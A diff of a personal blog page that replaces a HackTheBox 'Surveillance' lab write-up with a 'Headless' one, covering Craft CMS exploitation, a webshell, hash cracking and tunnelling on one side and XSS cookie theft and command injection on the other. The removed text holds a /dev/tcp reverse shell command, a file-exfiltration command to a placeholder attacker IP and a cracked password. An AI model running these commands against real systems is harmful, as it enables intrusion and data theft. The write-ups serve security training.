@@ -27,22 +27,22 @@
   
   <meta name="theme-color" content="#000000" />
   <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>HTB Surveillance writeup | Gabriel blog</title>
+<title>HTB Headless writeup | Gabriel blog</title>
 <meta name="generator" content="Jekyll v3.9.5" />
-<meta property="og:title" content="HTB Surveillance writeup" />
+<meta property="og:title" content="HTB Headless writeup" />
 <meta name="author" content="gabri47" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="In this machine, we have a web service vulnerable to RCE of Craft CMS 4.4.14 exploit that give us access to www-data. Next, we can see the hash of matthew in a sql file and crack it to give us the password. Then, we can see a port opened on localhost that has a web service running a zoneminder video surveillance software system version which is vulnerable to RCE and give us access to zoneminder user. Last, we have a sudoers privilege on zoneminder user that let us run any perl script related to zoneminder like root. We can exploit it because one script has the –user parameter to execute a command without any validations that let us inject a command in the –user parameter." />
-<meta property="og:description" content="In this machine, we have a web service vulnerable to RCE of Craft CMS 4.4.14 exploit that give us access to www-data. Next, we can see the hash of matthew in a sql file and crack it to give us the password. Then, we can see a port opened on localhost that has a web service running a zoneminder video surveillance software system version which is vulnerable to RCE and give us access to zoneminder user. Last, we have a sudoers privilege on zoneminder user that let us run any perl script related to zoneminder like root. We can exploit it because one script has the –user parameter to execute a command without any validations that let us inject a command in the –user parameter." />
-<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Surveillance.html" />
-<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Surveillance.html" />
+<meta name="description" content="Headless is an Easy Linux machine of HackTheBox where first its needed to make a XSS attack in the User-Agent as its reflected on the admin’s dashboard. Then, we have to inject a command in a user-input field to gain access to the machine. Finally, in the sudo privileges its possible to see that a file is being executed from the current directory without an absolute path, so we can create ours and execute the command we want." />
+<meta property="og:description" content="Headless is an Easy Linux machine of HackTheBox where first its needed to make a XSS attack in the User-Agent as its reflected on the admin’s dashboard. Then, we have to inject a command in a user-input field to gain access to the machine. Finally, in the sudo privileges its possible to see that a file is being executed from the current directory without an absolute path, so we can create ours and execute the command we want." />
+<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Headless.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Headless.html" />
 <meta property="og:site_name" content="Gabriel blog" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2024-04-17T00:00:00+02:00" />
+<meta property="article:published_time" content="2024-07-20T00:00:00+02:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="HTB Surveillance writeup" />
+<meta property="twitter:title" content="HTB Headless writeup" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-04-17T00:00:00+02:00","datePublished":"2024-04-17T00:00:00+02:00","description":"In this machine, we have a web service vulnerable to RCE of Craft CMS 4.4.14 exploit that give us access to www-data. Next, we can see the hash of matthew in a sql file and crack it to give us the password. Then, we can see a port opened on localhost that has a web service running a zoneminder video surveillance software system version which is vulnerable to RCE and give us access to zoneminder user. Last, we have a sudoers privilege on zoneminder user that let us run any perl script related to zoneminder like root. We can exploit it because one script has the –user parameter to execute a command without any validations that let us inject a command in the –user parameter.","headline":"HTB Surveillance writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Surveillance.html"},"url":"http://localhost:4000/writeups/2024/HTB/Surveillance.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-07-20T00:00:00+02:00","datePublished":"2024-07-20T00:00:00+02:00","description":"Headless is an Easy Linux machine of HackTheBox where first its needed to make a XSS attack in the User-Agent as its reflected on the admin’s dashboard. Then, we have to inject a command in a user-input field to gain access to the machine. Finally, in the sudo privileges its possible to see that a file is being executed from the current directory without an absolute path, so we can create ours and execute the command we want.","headline":"HTB Headless writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Headless.html"},"url":"http://localhost:4000/writeups/2024/HTB/Headless.html"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -409,7 +409,7 @@
       <h1 class="d-flex w-100 justify-content-between">
         
         
-          <span>HTB Surveillance writeup</span> <span class="points"> [30 pts] </span>
+          <span>HTB Headless writeup</span> <span class="points"> [20 pts] </span>
         
         
       </h1>
@@ -419,7 +419,7 @@
 
 </script>
 
-<p>In this machine, we have a web service vulnerable to RCE of <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892">Craft CMS 4.4.14 exploit</a> that give us access to www-data. Next, we can see the hash of matthew in a sql file and crack it to give us the password. Then, we can see a port opened on localhost that has a web service running a zoneminder video surveillance software system version which is vulnerable to <a href="https://github.com/rvizx/CVE-2023-26035">RCE</a> and give us access to zoneminder user. Last, we have a sudoers privilege on zoneminder user that let us run any perl script related to zoneminder like root. We can exploit it because one script has the –user parameter to execute a command without any validations that let us inject a command in the –user parameter.</p>
+<p>Headless is an Easy Linux machine of HackTheBox where first its needed to make a XSS attack in the User-Agent as its reflected on the admin’s dashboard. Then, we have to inject a command in a user-input field to gain access to the machine. Finally, in the sudo privileges its possible to see that a file is being executed from the current directory without an absolute path, so we can create ours and execute the command we want.</p>
     
       <h1 id="enumeration">
         
@@ -428,27 +428,113 @@
         
         
       </h1>
+    
+      <h2 id="port-scanning">
+        
+        
+          Port scanning <a href="#port-scanning" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h2>
 
-<p>First, we start with a basic port scanning:</p>
+<p>We start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
 
-<pre><code class="language-python">❯ sudo nmap -sVC -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.245 -oN tcpTargeted
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 17:24 CEST
-Nmap scan report for 10.10.11.245
-Host is up (0.10s latency).
-Not shown: 59911 closed tcp ports (reset), 5622 filtered tcp ports (no-response)
+<pre><code class="language-bash">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.8
+# Nmap 7.94SVN scan initiated Sat Jul 20 19:15:57 2024 as: nmap -sSVC -p- --open --min-rate 5000 -v -n -Pn -oN headless 10.10.11.8
+Nmap scan report for 10.10.11.8
+Host is up (0.24s latency).
+Not shown: 37194 closed tcp ports (reset), 28339 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
 | ssh-hostkey: 
-|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
-|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
-80/tcp open  http    nginx 1.18.0 (Ubuntu)
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-|_http-title: Did not follow redirect to http://surveillance.htb/
+|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
+|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
+5000/tcp open  upnp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.2.2 Python/3.11.2
+|     Date: Sat, 20 Jul 2024 17:08:23 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 2799
+|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="UTF-8"&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+|     &lt;title&gt;Under Construction&lt;/title&gt;
+|     &lt;style&gt;
+|     body {
+|     font-family: 'Arial', sans-serif;
+|     background-color: #f7f7f7;
+|     margin: 0;
+|     padding: 0;
+|     display: flex;
+|     justify-content: center;
+|     align-items: center;
+|     height: 100vh;
+|     .container {
+|     text-align: center;
+|     background-color: #fff;
+|     border-radius: 10px;
+|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
+|   RTSPRequest: 
+|     &lt;!DOCTYPE HTML&gt;
+|     &lt;html lang="en"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5000-TCP:V=7.94SVN%I=7%D=7/20%Time=669BF0EA%P=x86_64-pc-linux-gnu%r
+SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
+SF:x20Python/3\.11\.2\r\nDate:\x20Sat,\x2020\x20Jul\x202024\x2017:08:23\x2
+SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
+SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
+SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\
+SF:x20lang=\"en\"&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\"UTF-8\"&gt;\n\
+SF:x20\x20\x20\x20&lt;meta\x20name=\"viewport\"\x20content=\"width=device-wid
+SF:th,\x20initial-scale=1\.0\"&gt;\n\x20\x20\x20\x20&lt;title&gt;Under\x20Construct
+SF:ion&lt;/title&gt;\n\x20\x20\x20\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20b
+SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
+SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
+SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
+SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
+SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"&lt;!DOCTYP
+SF:E\x20HTML&gt;\n&lt;html\x20lang=\"en\"&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20
+SF:\x20\x20\x20\x20\x20&lt;meta\x20charset=\"utf-8\"&gt;\n\x20\x20\x20\x20\x20\x
+SF:20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x
+SF:20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20resp
+SF:onse&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;
+SF:\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20vers
+SF:ion\x20\('RTSP/1\.0'\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\
+SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
+SF:20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 25.43 seconds
+# Nmap done at Sat Jul 20 19:18:09 2024 -- 1 IP address (1 host up) scanned in 131.76 seconds
 </code></pre>
 
 <ul>
@@ -456,13 +542,15 @@ Nmap done: 1 IP address (1 host up) scanned in 25.43 seconds
   <li>-p-: scans all the range of ports (1-65535).</li>
   <li>–open: shows only open ports and not filtered or closed.</li>
   <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
-  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a real environment).</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
+real environment).</li>
   <li>-n: Disables DNS resolution protocol.</li>
+  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
   <li>-Pn: Disables host discovery protocol (ping).</li>
   <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
 </ul>
 
-<p>We see the port 22 and 80. Also, we have the domain surveillance.htb so I will add it to the /etc/hosts. Since we don’t have credentials because we are in the recon phase, let’s enumerate the port 80.</p>
+<p>There is port 22 for ssh and a 5000 for http, let’s take a look at http service.</p>
     
       <h2 id="web-enumeration">
         
@@ -472,72 +560,142 @@ Nmap done: 1 IP address (1 host up) scanned in 25.43 seconds
         
       </h2>
 
-<p>In this step, I will launch whatweb to recognize a little bit the web.</p>
+<p>The 5000 port seems like a python werkzeug web server as saw in the headers:</p>
 
-<pre><code class="language-plaintext">❯ whatweb http://surveillance.htb
-http://surveillance.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@surveillance.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.245], JQuery[3.4.1], Script[text/javascript], Title[Surveillance], X-Powered-By[Craft CMS], X-UA-Compatible[IE=edge], nginx[1.18.0]
+<pre><code class="language-bash">❯ curl -i -s http://10.10.11.8:5000 | head
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.2 Python/3.11.2
+Date: Sat, 20 Jul 2024 17:19:55 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 2799
+Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+Connection: close
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
 </code></pre>
 
-<p>We can see that is powered by Craft CMS and if we look in the source page of the web we can see that it’s version 4.4.14:</p>
+<p>There is a cookie <code>is_admin</code> which is interesting. Looking in the browser, there’s a support questions page:</p>
 
-<p><img src="/assets/images/Surveillance/version-4.4.14.png" alt="4.4.14"></p>
+<p><img src="/assets/images/Headless/main-page.png" alt="main page"></p>
 
-<p>Now if we search in google for exploits for this version, we can see <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892">this page</a> that has a exploit written in python which we can run to obtain RCE:</p>
+<p><img src="/assets/images/Headless/support-page.png" alt="support page"></p>
 
-<pre><code class="language-plaintext">❯ git clone https://github.com/Faelian/CraftCMS_CVE-2023-41892
-Cloning into 'CraftCMS_CVE-2023-41892'...
-remote: Enumerating objects: 16, done.
-remote: Counting objects: 100% (16/16), done.
-remote: Compressing objects: 100% (14/14), done.
-remote: Total 16 (delta 2), reused 9 (delta 0), pack-reused 0
-Receiving objects: 100% (16/16), 82.87 KiB | 684.00 KiB/s, done.
-Resolving deltas: 100% (2/2), done.
-❯ cd CraftCMS_CVE-2023-41892
-❯ ls
-craft-cms.py  exploit.png  README.md
-❯ python3 craft-cms.py http://surveillance.htb
-[+] Executing phpinfo to extract some config infos
-temporary directory: /tmp
-web server root: /var/www/html/craft/web
-[+] create shell.php in /tmp
-[+] trick imagick to move shell.php in /var/www/html/craft/web
+<p>Fuzzing for valid routes, its possible to see /dashboard which returns 500:</p>
 
-[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami
-[+] Remember to delete shell.php in /var/www/html/craft/web when you're done
+<pre><code class="language-bash">❯ ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.8:5000/FUZZ -mc all -fc 404 -t 100
 
-[!] Enjoy your shell
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
-&gt; whoami
-www-data
+       v2.1.0-dev
+________________________________________________
 
-&gt;
+ :: Method           : GET
+ :: URL              : http://10.10.11.8:5000/FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: all
+ :: Filter           : Response status: 404
+________________________________________________
+
+dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 229ms]
+support                 [Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 181ms]
+:: Progress: [4727/4727] :: Job [1/1] :: 64 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
 </code></pre>
+
+<p>If we insert a <code>&lt;&gt;</code> for html injection in the support fields it says “Hacking attempt detected”:</p>
+
+<p><img src="/assets/images/Headless/&lt;&gt;hacking-attempt-dettected.png" alt="&lt;&gt; hacking attempt detected"></p>
+
+<p>And it reflects our headers in the page saying that the browser information has been sent to the administrators:</p>
+
+<p><img src="/assets/images/Headless/request-headers-sent-to-administrators.png" alt="request headers sent to administrators"></p>
+
+<p>The HTML its successfully injected when put in the headers:</p>
+
+<p><img src="/assets/images/Headless/html-injection-successfull.png" alt="html injection successfull"></p>
+
+<p>In case this data is reviewed by the administrators, I can send myself a cookie of him. First I will start an http server:</p>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p>And trigger the xss:</p>
+
+<p><img src="/assets/images/Headless/xss-triggered.png" alt="xss triggered"></p>
+
+<p>I’m able to receive the cookie of some administrator from 10.10.11.8 which is the machine’s IP:</p>
+
+<p><img src="/assets/images/Headless/cookie-received.png" alt="cookie received"></p>
+
+<p>I will insert it, navigate to /dashboard and see I have access:</p>
+
+<p><img src="/assets/images/Headless/access-to-dashboard.png" alt="access to dashboard"></p>
     
-      <h1 id="access-as-www-data">
+      <h1 id="access-as-dvir">
         
         
-          Access as www-data <a href="#access-as-www-data" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+          Access as dvir <a href="#access-as-dvir" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
         
         
       </h1>
 
-<p>Now i will establish a reverse shell by spawning a nc listener and executing the command <code>bash -c "bash -i &gt;&amp; /dev/tcp/&lt;YOUR IP&gt;/&lt;YOUR PORT&gt; 0&gt;&amp;1"</code></p>
+<p>Clicking on “Generate Report”, I see its passing a date parameter:</p>
 
-<p><img src="/assets/images/Surveillance/shell.png" alt="Shell"></p>
+<p><img src="/assets/images/Headless/date-parameter-dashbaord.png" alt="date parameter dashboard"></p>
 
-<p>And now i will stabilize the tty for doing ctrl+c, ctrl+l, etc:</p>
+<p>Testing command injection works:</p>
 
-<pre><code class="language-plaintext">www-data@surveillance:~/html/craft/web$ script /dev/null -c bash
+<p><img src="/assets/images/Headless/command-injection-works.png" alt="command injection works"></p>
+
+<p>So I will run the typical reverse shell command to gain access as dvir. First spawn a nc listener:</p>
+
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<p>Trigger the reverse shell:</p>
+
+<p><img src="/assets/images/Headless/reverse-shell-triggered.png" alt="reverse shell triggered"></p>
+
+<p>We receive a shell as dvir and successfully can see user.txt:</p>
+
+<p><img src="/assets/images/Headless/shell-as-dvir.png" alt="shell as dvir"></p>
+
+<pre><code class="language-bash">dvir@headless:~/app$ cd
+cd
+dvir@headless:~$ ls
+ls
+app
+geckodriver.log
+user.txt
+dvir@headless:~$ cat user.txt
+cat user.txt
+b8****************************00
+</code></pre>
+
+<p>Let’s do the common tty trick to have a completely interactive shell where we can do ctrl+l, ctrl+c without killing the shell, etc:</p>
+
+<pre><code class="language-bash">dvir@headless:~$ script /dev/null -c bash
 script /dev/null -c bash
 Script started, output log file is '/dev/null'.
-www-data@surveillance:~/html/craft/web$ ^Z
-[1]  + 98485 suspended  nc -lvnp 443
-❯ stty raw -echo;fg
-[1]  + 98485 continued  nc -lvnp 443
+dvir@headless:~$ ^Z
+[1]  + 41760 suspended  nc -lvnp 443
+❯ stty raw -echo; fg
+[1]  + 41760 continued  nc -lvnp 443
                                     reset xterm
-www-data@surveillance:~/html/craft/web$ export TERM=xterm
-www-data@surveillance:~/html/craft/web$ export SHELL=bash
-www-data@surveillance:~/html/craft/web$ stty rows &lt;YOUR TERMINAL ROWS&gt; columns &lt;YOUR TERMINAL COLUMNS&gt;
+dvir@headless:~$ export TERM=xterm
+dvir@headless:~$ export SHELL=bash
+dvir@headless:~$ stty rows 50 columns 184
 </code></pre>
 
 <ul>
@@ -554,174 +712,9 @@ www-data@surveillance:~/html/craft/web$ stty rows &lt;YOUR TERMINAL ROWS&gt; col
   <li>
 <code>export SHELL=bash</code>: specifies the system that we are using a bash console.</li>
   <li>
-<code>stty rows &lt;YOUR ROWS&gt; columns &lt;YOUR COLUMNS&gt;</code>: establishes the size of the current full terminal window, you can view the adequate running stty size on your machine.</li>
+<code>stty rows &lt;YOUR ROWS&gt; columns &lt;YOUR COLUMNS&gt;</code>: establishes the size of the current full terminal window, you can view the adequate running stty size on your machine (you 
+can view it with <code>stty size</code> in a complete new window).</li>
 </ul>
-    
-      <h1 id="access-as-matthew">
-        
-        
-          Access as matthew <a href="#access-as-matthew" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
-        
-        
-      </h1>
-
-<p>Let’s see the users that have a shell in this machine:</p>
-
-<pre><code class="language-plaintext">www-data@surveillance:~/html/craft$ cat /etc/passwd | grep "sh$"
-root:x:0:0:root:/root:/bin/bash
-matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
-zoneminder:x:1001:1001:,,,:/home/zoneminder:/bin/bash
-</code></pre>
-
-<p>Without root, we have matthew and zoneminder.</p>
-
-<p>Now I will search for configuration files in the webroot that has credentials for some user.</p>
-
-<p>In /var/www/html/craft/.env we can see credentials for connection to the MySQL database of the user craftuser. When we access as that user in the database, we see an admin hash but it seems that isn’t crackable.</p>
-
-<p>Now if we look in <code>/var/www/html/craft/storage/backups</code>, we have a zip, let’s transfer it to my machine using <code>cat [FILE TO TRANSFER] &gt; /dev/tcp/&lt;YOUR IP&gt;/&lt;YOUR LISTENING PORT&gt;</code>.</p>
-
-<p><img src="/assets/images/Surveillance/transfer_sql_backup.png" alt="Transfering SQL backup"></p>
-
-<p>Next, I will proceed to unzip it and inspect it:</p>
-
-<pre><code class="language-plaintext">❯ unzip surveillance_backup.zip
-Archive:  surveillance_backup.zip
-  inflating: surveillance--2023-10-17-202801--v4.4.14.sql  
-❯ file surveillance--2023-10-17-202801--v4.4.14.sql
-surveillance--2023-10-17-202801--v4.4.14.sql: ASCII text
-</code></pre>
-
-<p>Let’s grep for the command “INSERT INTO” to see which values are inserted in the tables and see if we can retrieve some hash of some user:</p>
-
-<pre><code class="language-plaintext">❯ cat surveillance--2023-10-17-202801--v4.4.14.sql | grep "INSERT INTO"
-&lt;SNIP&gt;
-INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
-&lt;SNIP&gt;
-</code></pre>
-
-<p>We have a hash for the user matthew, now let’s crack it:</p>
-<pre><code class="language-plaintext">❯ john -w=/usr/share/wordlists/rockyou.txt matthew.hash --format=Raw-SHA256
-Using default input encoding: UTF-8
-Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
-Warning: poor OpenMP scalability for this hash type, consider --fork=4
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-starcraft122490  (?)     
-1g 0:00:00:00 DONE (2024-04-17 19:11) 3.225g/s 11627Kp/s 11627Kc/s 11627KC/s stefon23..sozardme
-Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
-Session completed.
-</code></pre>
-
-<p>Now, we can migrate to that user and see user.txt:</p>
-
-<pre><code class="language-bash">www-data@surveillance:~/html/craft/storage/backups$ su matthew
-Password: starcraft122490 
-matthew@surveillance:/var/www/html/craft/storage/backups$ whoami
-matthew
-matthew@surveillance:/var/www/html/craft/storage/backups$ cd /home/matthew/
-matthew@surveillance:~$ cat user.txt
-e11642e5faad074f8c3ee154d53609df
-</code></pre>
-    
-      <h1 id="access-as-zoneminder">
-        
-        
-          Access as zoneminder <a href="#access-as-zoneminder" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
-        
-        
-      </h1>
-
-<p>If we see the services running on localhost in the machine, we can see that there is another web service running on port 8080:</p>
-
-<pre><code class="language-bash">matthew@surveillance:~$ netstat -ntlp
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    LISTEN      -
-</code></pre>
-
-<p>I will forward it to my machine with <a href="https://github.com/jpillora/chisel">chisel</a>:</p>
-    
-      <h2 id="transfer">
-        
-        
-          Transfer <a href="#transfer" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
-        
-        
-      </h2>
-
-<p>In the attacker’s machine:</p>
-
-<pre><code class="language-bash">❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-</code></pre>
-
-<p>In the victim’s machine:</p>
-
-<pre><code class="language-bash">matthew@surveillance:~$ cd /tmp
-matthew@surveillance:/tmp$ wget http://&lt;YOUR IP&gt;/chisel
-</code></pre>
-    
-      <h2 id="port-forwarding">
-        
-        
-          Port forwarding <a href="#port-forwarding" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
-        
-        
-      </h2>
-
-<p>In the attacker’s machine:</p>
-
-<pre><code class="language-bash">❯ ./chisel server -p 1234 --reverse
-2024/04/17 19:32:17 server: Reverse tunnelling enabled
-2024/04/17 19:32:17 server: Fingerprint Jxtsiq9PliwT2OzxzND0lOoMiHcCBqwuSN8Q6i3q5cg=
-2024/04/17 19:32:17 server: Listening on http://0.0.0.0:1234
-2024/04/17 19:32:46 server: session#6: tun: proxy#R:8080=&gt;8080: Listening
-</code></pre>
-
-<p>In the victim’s machine:</p>
-
-<pre><code class="language-bash">matthew@surveillance:/tmp$ ./chisel client 10.10.14.114:1234 R:8080:127.0.0.1:8080
-2024/04/17 17:32:45 client: Connecting to ws://10.10.14.114:1234
-2024/04/17 17:32:46 client: Connected (Latency 94.27049ms)
-</code></pre>
-    
-      <h2 id="enumeration-1">
-        
-        
-          Enumeration <a href="#enumeration-1" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
-        
-        
-      </h2>
-
-<p>Enumerating the 8080 web service, we can see that it runs something called “zoneminder”:</p>
-
-<p><img src="/assets/images/Surveillance/zoneminder_cms.png" alt="Zoneminder"></p>
-
-<p>Searching in google, we can see that Zoneminder is a video surveillance software system:</p>
-
-<p><img src="/assets/images/Surveillance/zoneminder_search.png" alt="Zoneminder search"></p>
-
-<p>Looking for exploits on google, we found <a href="https://github.com/rvizx/CVE-2023-26035">this</a> one that says to exploit an RCE:</p>
-
-<p><img src="/assets/images/Surveillance/zoneminder_exploit_page.png" alt="Zoneminder exploit page"></p>
-
-<p>Now let’s execute it:</p>
-
-<pre><code class="language-bash">❯ nc -lvnp 443
-❯ git clone https://github.com/rvizx/CVE-2023-26035
